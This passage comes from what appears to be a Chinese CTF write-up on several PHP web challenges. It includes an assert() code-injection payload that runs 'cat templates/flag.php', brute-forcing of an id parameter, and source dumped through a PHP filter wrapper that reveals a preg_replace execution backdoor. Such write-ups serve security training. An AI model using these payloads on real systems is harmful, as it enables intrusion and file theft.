class="comment">find 必需。规定要查找的字符串。</span></span><br><span class="line"><span class="comment">start 可选。规定在何处开始搜索。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">assert()函数其实是一个断言函数。</span></span><br><span class="line"><span class="comment">assert：</span></span><br><span class="line"><span class="comment">　　这个函数在php语言中是用来判断一个表达式是否成立。返回true or false;</span></span><br><span class="line"><span class="comment">　　　　　　　　assert ( mixed $assertion [, string $description ] ) : bool</span></span><br><span class="line"><span class="comment">　　如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">                &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">                &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">                &lt;title&gt;My PHP Website&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">                &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span> /&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">                &lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">inverse</span> <span class="title">navbar</span>-<span class="title">fixed</span>-<span class="title">top</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">button</span>&quot; <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">toggle</span> <span class="title">collapsed</span>&quot; <span class="title">data</span>-<span class="title">toggle</span>=&quot;<span class="title">collapse</span>&quot; <span class="title">data</span>-<span class="title">target</span>=&quot;#<span class="title">navbar</span>&quot; <span class="title">aria</span>-<span class="title">expanded</span>=&quot;<span class="title">false</span>&quot; <span class="title">aria</span>-<span class="title">controls</span>=&quot;<span class="title">navbar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">sr</span>-<span class="title">only</span>&quot;&gt;<span class="title">Toggle</span> <span class="title">navigation</span>&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>-<span class="title">bar</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>-<span class="title">bar</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>-<span class="title">bar</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Project</span> <span class="title">name</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">navbar</span>&quot; <span class="title">class</span>=&quot;<span class="title">collapse</span> <span class="title">navbar</span>-<span class="title">collapse</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">li</span> &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">page</span> == &quot;<span class="title">home</span>&quot;) </span>&#123; <span class="meta">?&gt;</span><span class="class"><span class="keyword">class</span>=&quot;<span class="title">active</span>&quot;&lt;?<span class="title">php</span> &#125; ?&gt;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">page</span>=<span class="title">home</span>&quot;&gt;<span class="title">Home</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">li</span> &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">page</span> == &quot;<span class="title">about</span>&quot;) </span>&#123; <span class="meta">?&gt;</span><span class="class"><span class="keyword">class</span>=&quot;<span class="title">active</span>&quot;&lt;?<span class="title">php</span> &#125; ?&gt;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">page</span>=<span class="title">about</span>&quot;&gt;<span class="title">About</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">li</span> &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">page</span> == &quot;<span class="title">contact</span>&quot;) </span>&#123; <span class="meta">?&gt;</span><span class="class"><span class="keyword">class</span>=&quot;<span class="title">active</span>&quot;&lt;?<span class="title">php</span> &#125; ?&gt;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">page</span>=<span class="title">contact</span>&quot;&gt;<span class="title">Contact</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                                                &lt;!--&lt;<span class="title">li</span> &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">page</span> == &quot;<span class="title">flag</span>&quot;) </span>&#123; <span class="meta">?&gt;</span><span class="class"><span class="keyword">class</span>=&quot;<span class="title">active</span>&quot;&lt;?<span class="title">php</span> &#125; ?&gt;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">page</span>=<span class="title">flag</span>&quot;&gt;<span class="title">My</span> <span class="title">secrets</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; --&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>: 50<span class="title">px</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                                <span class="title">require_once</span> $<span class="title">file</span>;</span></span><br><span class="line"><span class="class">                        ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">https</span>://<span class="title">cdnjs</span>.<span class="title">cloudflare</span>.<span class="title">com</span>/<span class="title">ajax</span>/<span class="title">libs</span>/<span class="title">jquery</span>/1.12.4/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">https</span>://<span class="title">cdnjs</span>.<span class="title">cloudflare</span>.<span class="title">com</span>/<span class="title">ajax</span>/<span class="title">libs</span>/<span class="title">twitter</span>-<span class="title">bootstrap</span>/3.3.7/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert(&quot;strpos(&#x27;templates/1&#x27;,&#x27;abc&#x27;)===false and system(&quot;cat templates/flag.php&quot;) and strpos(&#x27;1&#x27;,&#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">/?page=1&#x27;,&#x27;abc&#x27;)===false and system(&quot;cat templates/flag.php&quot;) and strpos(&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205150803596.png" alt="image-20221205150803596"></p>
<h2 id="33-ics-06"><a href="#33-ics-06" class="headerlink" title="33.ics-06"></a>33.ics-06</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205152512905.png" alt="image-20221205152512905"></p>
<p>只有报表中心可以打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205152538846.png" alt="image-20221205152538846"></p>
<p>发现URL中有id&#x3D;1</p>
<p>尝试修改id</p>
<p>爆破</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205153038234.png" alt="image-20221205153038234"></p>
<p>发现长度不一样的</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205153310069.png" alt="image-20221205153310069"></p>
<p>输入URL看看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205153340897.png" alt="image-20221205153340897"></p>
<h2 id="34-ics-05"><a href="#34-ics-05" class="headerlink" title="34.ics-05"></a>34.ics-05</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205153456986.png" alt="image-20221205153456986"></p>
<p>只有设备维护中心可以打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205153536307.png" alt="image-20221205153536307"></p>
<p>查看源代码</p>
<p>发现page&#x3D;</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205154226508.png" alt="image-20221205154226508"></p>
<p>尝试传参</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205154245790.png" alt="image-20221205154245790"></p>
<p>发现执行了</p>
<p>这时候尝试PHP伪协议获取源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205154540130.png" alt="image-20221205154540130"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwoKQHNlc3Npb25fc3RhcnQoKTsKcG9zaXhfc2V0dWlkKDEwMDApOwoKCj8+CjwhRE9DVFlQRSBIVE1MPgo8aHRtbD4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgbmFtZT0icmVuZGVyZXIiIGNvbnRlbnQ9IndlYmtpdCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UsY2hyb21lPTEiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBtYXhpbXVtLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJsYXl1aS9jc3MvbGF5dWkuY3NzIiBtZWRpYT0iYWxsIj4KICAgIDx0aXRsZT7orr7lpIfnu7TmiqTkuK3lv4M8L3RpdGxlPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDx1bCBjbGFzcz0ibGF5dWktbmF2Ij4KICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLXRoaXMiPjxhIGhyZWY9Ij9wYWdlPWluZGV4Ij7kupHlubPlj7Dorr7lpIfnu7TmiqTkuK3lv4M8L2E+PC9saT4KICAgIDwvdWw+CiAgICA8ZmllbGRzZXQgY2xhc3M9ImxheXVpLWVsZW0tZmllbGQgbGF5dWktZmllbGQtdGl0bGUiIHN0eWxlPSJtYXJnaW4tdG9wOiAzMHB4OyI+CiAgICAgICAgPGxlZ2VuZD7orr7lpIfliJfooag8L2xlZ2VuZD4KICAgIDwvZmllbGRzZXQ+CiAgICA8dGFibGUgY2xhc3M9ImxheXVpLWhpZGUiIGlkPSJ0ZXN0Ij48L3RhYmxlPgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2h0bWwiIGlkPSJzd2l0Y2hUcGwiPgogICAgICAgIDwhLS0g6L+Z6YeM55qEIGNoZWNrZWQg55qE54q25oCB5Y+q5piv5ryU56S6IC0tPgogICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ic2V4IiB2YWx1ZT0ie3tkLmlkfX0iIGxheS1za2luPSJzd2l0Y2giIGxheS10ZXh0PSLlvIB85YWzIiBsYXktZmlsdGVyPSJjaGVja0RlbW8iIHt7IGQuaWQ9PTEgMDAwMyA/ICdjaGVja2VkJyA6ICcnIH19PgogICAgPC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0ibGF5dWkvbGF5dWkuanMiIGNoYXJzZXQ9InV0Zi04Ij48L3NjcmlwdD4KICAgIDxzY3JpcHQ+CiAgICBsYXl1aS51c2UoJ3RhYmxlJywgZnVuY3Rpb24oKSB7CiAgICAgICAgdmFyIHRhYmxlID0gbGF5dWkudGFibGUsCiAgICAgICAgICAgIGZvcm0gPSBsYXl1aS5mb3JtOwoKICAgICAgICB0YWJsZS5yZW5kZXIoewogICAgICAgICAgICBlbGVtOiAnI3Rlc3QnLAogICAgICAgICAgICB1cmw6ICcvc29tcnRoaW5nLmpzb24nLAogICAgICAgICAgICBjZWxsTWluV2lkdGg6IDgwLAogICAgICAgICAgICBjb2xzOiBbCiAgICAgICAgICAgICAgICBbCiAgICAgICAgICAgICAgICAgICAgeyB0eXBlOiAnbnVtYmVycycgfSwKICAgICAgICAgICAgICAgICAgICAgeyB0eXBlOiAnY2hlY2tib3gnIH0sCiAgICAgICAgICAgICAgICAgICAgIHsgZmllbGQ6ICdpZCcsIHRpdGxlOiAnSUQnLCB3aWR0aDogMTAwLCB1bnJlc2l6ZTogdHJ1ZSwgc29ydDogdHJ1ZSB9LAogICAgICAgICAgICAgICAgICAgICB7IGZpZWxkOiAnbmFtZScsIHRpdGxlOiAn6K6+5aSH5ZCNJywgdGVtcGxldDogJyNuYW1lVHBsJyB9LAogICAgICAgICAgICAgICAgICAgICB7IGZpZWxkOiAnYXJlYScsIHRpdGxlOiAn5Yy65Z+fJyB9LAogICAgICAgICAgICAgICAgICAgICB7IGZpZWxkOiAnc3RhdHVzJywgdGl0bGU6ICfnu7TmiqTnirbmgIEnLCBtaW5XaWR0aDogMTIwLCBzb3J0OiB0cnVlIH0sCiAgICAgICAgICAgICAgICAgICAgIHsgZmllbGQ6ICdjaGVjaycsIHRpdGxlOiAn6K6+5aSH5byA5YWzJywgd2lkdGg6IDg1LCB0ZW1wbGV0OiAnI3N3aXRjaFRwbCcsIHVucmVzaXplOiB0cnVlIH0KICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgcGFnZTogdHJ1ZQogICAgICAgIH0pOwogICAgfSk7CiAgICA8L3NjcmlwdD4KICAgIDxzY3JpcHQ+CiAgICBsYXl1aS51c2UoJ2VsZW1lbnQnLCBmdW5jdGlvbigpIHsKICAgICAgICB2YXIgZWxlbWVudCA9IGxheXVpLmVsZW1lbnQ7IC8v5a+86Iiq55qEaG92ZXLmlYjmnpzjgIHkuoznuqfoj5zljZXnrYnlip/og73vvIzpnIDopoHkvp3otZZlbGVtZW505qih5Z2XCiAgICAgICAgLy/nm5HlkKzlr7zoiKrngrnlh7sKICAgICAgICBlbGVtZW50Lm9uKCduYXYoZGVtbyknLCBmdW5jdGlvbihlbGVtKSB7CiAgICAgICAgICAgIC8vY29uc29sZS5sb2coZWxlbSkKICAgICAgICAgICAgbGF5ZXIubXNnKGVsZW0udGV4dCgpKTsKICAgICAgICB9KTsKICAgIH0pOwogICAgPC9zY3JpcHQ+Cgo8P3BocAoKJHBhZ2UgPSAkX0dFVFtwYWdlXTsKCmlmIChpc3NldCgkcGFnZSkpIHsKCgoKaWYgKGN0eXBlX2FsbnVtKCRwYWdlKSkgewo/PgoKICAgIDxiciAvPjxiciAvPjxiciAvPjxiciAvPgogICAgPGRpdiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj48P3BocCBlY2hvICRwYWdlOyBkaWUoKTs/PjwvcD4KICAgIDxiciAvPjxiciAvPjxiciAvPjxiciAvPgoKPD9waHAKCn1lbHNlewoKPz4KICAgICAgICA8YnIgLz48YnIgLz48YnIgLz48YnIgLz4KICAgICAgICA8ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+CiAgICAgICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgICAgICAgIDw/cGhwCgogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkcGFnZSwgJ2lucHV0JykgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgZGllKCk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkcGFnZSwgJ3RhOnRleHQnKSA+IDApIHsKICAgICAgICAgICAgICAgICAgICBkaWUoKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoc3RycG9zKCRwYWdlLCAndGV4dCcpID4gMCkgewogICAgICAgICAgICAgICAgICAgIGRpZSgpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkcGFnZSA9PT0gJ2luZGV4LnBocCcpIHsKICAgICAgICAgICAgICAgICAgICBkaWUoJ09rJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaW5jbHVkZSgkcGFnZSk7CiAgICAgICAgICAgICAgICAgICAgZGllKCk7CiAgICAgICAgICAgICAgICA/PgogICAgICAgIDwvcD4KICAgICAgICA8YnIgLz48YnIgLz48YnIgLz48YnIgLz4KCjw/cGhwCn19CgoKLy/mlrnkvr/nmoTlrp7njrDovpPlhaXovpPlh7rnmoTlip/og70s5q2j5Zyo5byA5Y+R5Lit55qE5Yqf6IO977yM5Y+q6IO95YaF6YOo5Lq65ZGY5rWL6K+VCgppZiAoJF9TRVJWRVJbJ0hUVFBfWF9GT1JXQVJERURfRk9SJ10gPT09ICcxMjcuMC4wLjEnKSB7CgogICAgZWNobyAiPGJyID5XZWxjb21lIE15IEFkbWluICEgPGJyID4iOwoKICAgICRwYXR0ZXJuID0gJF9HRVRbcGF0XTsKICAgICRyZXBsYWNlbWVudCA9ICRfR0VUW3JlcF07CiAgICAkc3ViamVjdCA9ICRfR0VUW3N1Yl07CgogICAgaWYgKGlzc2V0KCRwYXR0ZXJuKSAmJiBpc3NldCgkcmVwbGFjZW1lbnQpICYmIGlzc2V0KCRzdWJqZWN0KSkgewogICAgICAgIHByZWdfcmVwbGFjZSgkcGF0dGVybiwgJHJlcGxhY2VtZW50LCAkc3ViamVjdCk7CiAgICB9ZWxzZXsKICAgICAgICBkaWUoKTsKICAgIH0KCn0KCgoKCgo/PgoKPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>

<p>base64解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">posix_setuid</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;renderer&quot;</span> content=<span class="string">&quot;webkit&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;layui/css/layui.css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;设备维护中心&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">nav</span>-<span class="title">item</span> <span class="title">layui</span>-<span class="title">this</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">page</span>=<span class="title">index</span>&quot;&gt;云平台设备维护中心&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">fieldset</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">elem</span>-<span class="title">field</span> <span class="title">layui</span>-<span class="title">field</span>-<span class="title">title</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>: 30<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">legend</span>&gt;设备列表&lt;/<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">table</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">hide</span>&quot; <span class="title">id</span>=&quot;<span class="title">test</span>&quot;&gt;&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">html</span>&quot; <span class="title">id</span>=&quot;<span class="title">switchTpl</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;!-- 这里的 <span class="title">checked</span> 的状态只是演示 --&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">name</span>=&quot;<span class="title">sex</span>&quot; <span class="title">value</span>=&quot;</span>&#123;&#123;d.id&#125;&#125;<span class="string">&quot; lay-skin=&quot;</span><span class="keyword">switch</span><span class="string">&quot; lay-text=&quot;</span>开|关<span class="string">&quot; lay-filter=&quot;</span>checkDemo<span class="string">&quot; &#123;&#123; d.id==1 0003 ? &#x27;checked&#x27; : &#x27;&#x27; &#125;&#125;&gt;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;</span>layui/layui.js<span class="string">&quot; charset=&quot;</span>utf-<span class="number">8</span><span class="string">&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">    layui.use(&#x27;table&#x27;, function() &#123;</span></span><br><span class="line"><span class="string">        var table = layui.table,</span></span><br><span class="line"><span class="string">            form = layui.form;</span></span><br><span class="line"><span class="string">        table.render(&#123;</span></span><br><span class="line"><span class="string">            elem: &#x27;#test&#x27;,</span></span><br><span class="line"><span class="string">            url: &#x27;/somrthing.json&#x27;,</span></span><br><span class="line"><span class="string">            cellMinWidth: 80,</span></span><br><span class="line"><span class="string">            cols: [</span></span><br><span class="line"><span class="string">                [</span></span><br><span class="line"><span class="string">                    &#123; type: &#x27;numbers&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; type: &#x27;checkbox&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;id&#x27;, title: &#x27;ID&#x27;, width: 100, unresize: true, sort: true &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;name&#x27;, title: &#x27;设备名&#x27;, templet: &#x27;#nameTpl&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;area&#x27;, title: &#x27;区域&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;status&#x27;, title: &#x27;维护状态&#x27;, minWidth: 120, sort: true &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;check&#x27;, title: &#x27;设备开关&#x27;, width: 85, templet: &#x27;#switchTpl&#x27;, unresize: true &#125;</span></span><br><span class="line"><span class="string">                ]</span></span><br><span class="line"><span class="string">            ],</span></span><br><span class="line"><span class="string">            page: true</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">    layui.use(&#x27;element&#x27;, function() 